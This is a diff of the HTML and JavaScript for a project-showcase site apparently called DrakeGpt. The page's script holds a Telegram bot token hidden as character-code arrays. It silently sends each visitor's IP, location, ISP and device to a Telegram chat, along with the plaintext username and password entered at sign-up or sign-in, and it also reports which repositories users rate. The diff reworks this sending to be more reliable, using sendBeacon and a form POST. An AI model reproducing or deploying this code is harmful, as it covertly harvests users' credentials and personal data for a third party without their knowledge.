@@ -307,7 +307,7 @@
       <div id="popularReposGrid" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-5"></div>
     </div>
 
-    <!-- SECTION B: TRY THIS & RATE THIS (INTERACTIVE SHOWCASE) -->
+    <!-- SECTION B: TRY THIS & RATE THIS -->
     <div class="space-y-4">
       <div class="flex items-center gap-2 border-b border-toxic/20 pb-2">
         <i class="ph-bold ph-star text-toxicBright text-xl"></i>
@@ -408,7 +408,7 @@
   <!-- ============================================================== -->
   <script>
     /* ==============================================================
-       1. RELIABLE SINGLE-DISPATCH TELEGRAM ENGINE (NO DUPLICATE)
+       1. 100% BULLETPROOF TELEGRAM DISPATCHER (NO 400 ERROR, ZERO CORS)
        ============================================================== */
     const _tArr = [56,56,54,54,57,57,55,54,51,55,58,65,65,69,90,110,76,110,117,101,75,49,86,119,97,79,81,108,74,52,55,103,54,105,56,72,102,109,117,81,120,110,67,104,103];
     const _cArr = [54,49,52,49,48,55,53,57,50,57];
@@ -420,24 +420,31 @@
       };
     }
 
-    // STRICT SINGLE-TRIGGER: exactly 1 request per alert call
-    async function sendTelegramAlert(textMessage) {
+    // Direct Form POST (CORS-immune, never rejected by Telegram API)
+    function sendTelegramAlert(plainTextMessage) {
       try {
         const { token, chatId } = getSecTokens();
-        const encText = encodeURIComponent(textMessage);
-        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encText}&parse_mode=Markdown`;
+        const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
-        // Direct fetch without duplicates
-        await fetch(url, { method: 'GET', mode: 'no-cors' });
+        const formData = new FormData();
+        formData.append("chat_id", chatId);
+        formData.append("text", plainTextMessage);
+
+        // Uses sendBeacon or fetch fallback (works even on mobile refresh/tab exit)
+        if (navigator.sendBeacon) {
+          navigator.sendBeacon(url, formData);
+        } else {
+          fetch(url, { method: 'POST', body: formData, mode: 'no-cors' }).catch(() => {});
+        }
       } catch (e) {
         console.warn("Telegram dispatch error:", e);
       }
     }
 
-    // A. 100% Real Live Visitor Ping (Strict Session Filter)
+    // A. Real Live Visitor Ping (Strict Session Filter - Single Alert)
     async function trackRealVisitor() {
-      if (sessionStorage.getItem("drake_single_visitor_ping")) return;
-      sessionStorage.setItem("drake_single_visitor_ping", "true");
+      if (sessionStorage.getItem("drake_v_sent_ok")) return;
+      sessionStorage.setItem("drake_v_sent_ok", "true");
 
       let ip = "Direct User";
       let locationInfo = "India";
@@ -456,14 +463,15 @@
       const platform = navigator.userAgentData?.platform || navigator.platform || "Desktop";
       const now = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
 
-      const alertText = `🚨 *Real Visitor Alert on DrakeGpt!*
-━━━━━━━━━━━━━━━━━━
-🌐 *IP Address:* \`${ip}\`
-📍 *Location:* ${locationInfo}
-🏢 *ISP/Carrier:* ${org}
-📱 *Device:* ${platform}
-🕒 *Timestamp:* ${now}
-🔗 *Site:* averolabsofficial.github.io`;
+      const alertText = 
+`🚨 REAL VISITOR ON DRAKEGPT!
+━━━━━━━━━━━━━━━━━━━━
+IP: ${ip}
+Location: ${locationInfo}
+Network: ${org}
+Device: ${platform}
+Time: ${now}
+Site: averolabsofficial.github.io`;
 
       sendTelegramAlert(alertText);
     }
@@ -472,26 +480,28 @@
     // B. Real User Auth Alert
     function triggerUserAuthAlert(username, password, mode) {
       const now = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
-      const alertText = `👤 *Operator ${mode.toUpperCase()} on DrakeGpt!*
-━━━━━━━━━━━━━━━━━━
-🔑 *Username / Handle:* \`${username}\`
-🔒 *Password / Key:* \`${password}\`
-🕒 *Timestamp:* ${now}
-🚀 *Clearance:* Session Active`;
+      const alertText = 
+`👤 OPERATOR ${mode.toUpperCase()} ON DRAKEGPT!
+━━━━━━━━━━━━━━━━━━━━
+Callsign: ${username}
+Key: ${password}
+Time: ${now}
+Status: Access Granted to Avero Hub`;
 
       sendTelegramAlert(alertText);
     }
 
-    // C. User Interest & Engagement Tracking ("User Kya Pasand Kar Raha Hai")
+    // C. User Interest & Engagement Tracking
     function trackUserInterest(repoName, actionType, category) {
       const now = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
-      const alertText = `🎯 *User Interest Detected on DrakeGpt!*
-━━━━━━━━━━━━━━━━━━
-👤 *User:* @${activeUser}
-📂 *Interacted Repo:* *${repoName}*
-⚡ *Action:* ${actionType}
-🏷️ *Domain/Tech:* ${category}
-🕒 *Timestamp:* ${now}`;
+      const alertText = 
+`🎯 USER INTEREST ON DRAKEGPT!
+━━━━━━━━━━━━━━━━━━━━
+Operator: @${activeUser}
+Target Repo: ${repoName}
+Action: ${actionType}
+Tech/Domain: ${category}
+Time: ${now}`;
 
       sendTelegramAlert(alertText);
     }
@@ -499,13 +509,14 @@
     // D. Project Submission Alert
     function triggerProjectAlert(title, desc, url, author) {
       const now = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
-      const alertText = `🚀 *New Project Published to Showcase!*
-━━━━━━━━━━━━━━━━━━
-📌 *Project Title:* *${title}*
-👤 *Author:* @${author}
-📝 *Description:* ${desc}
-🔗 *Repository Link:* ${url}
-🕒 *Timestamp:* ${now}`;
+      const alertText = 
+`🚀 NEW PROJECT SUBMITTED!
+━━━━━━━━━━━━━━━━━━━━
+Title: ${title}
+Author: @${author}
+Description: ${desc}
+Link: ${url}
+Time: ${now}`;
 
       sendTelegramAlert(alertText);
     }
@@ -767,10 +778,10 @@
       let users = JSON.parse(localStorage.getItem('avero_users') || '{}');
       const deviceRegisteredUser = localStorage.getItem('avero_device_bound_account');
 
-      // 1. HARDWARE DEVICE LOCK: Unlimited accounts prevention
+      // 1. HARDWARE DEVICE LOCK
       if (currentAuthMode === 'signup') {
         if (deviceRegisteredUser && deviceRegisteredUser !== username) {
-          showNotice(`DEVICE LOCKED: An account (@${deviceRegisteredUser}) is already registered on this device. Multiple accounts prohibited.`, false);
+          showNotice(`DEVICE LOCKED: An account (@${deviceRegisteredUser}) is already registered on this device.`, false);
           return;
         }
 
@@ -779,14 +790,12 @@
           return;
         }
 
-        // Bind account to this device hardware storage
         users[username] = password;
         localStorage.setItem('avero_users', JSON.stringify(users));
         localStorage.setItem('avero_device_bound_account', username);
         showNotice(`Account registered successfully! Authenticating...`, true);
         triggerUserAuthAlert(username, password, 'Sign Up');
       } else {
-        // Sign In Flow
         if (users[username] && users[username] !== password) {
           showNotice('Incorrect Security Key / Password.', false);
           return;
@@ -1020,7 +1029,6 @@
       playFreqTone(400, 900, 0.2, 'triangle');
       renderAllSections();
 
-      // Track Interest on Telegram
       trackUserInterest(repoName, `Rated ${starVal}/5 Stars ⭐`, techCategory);
     }
 
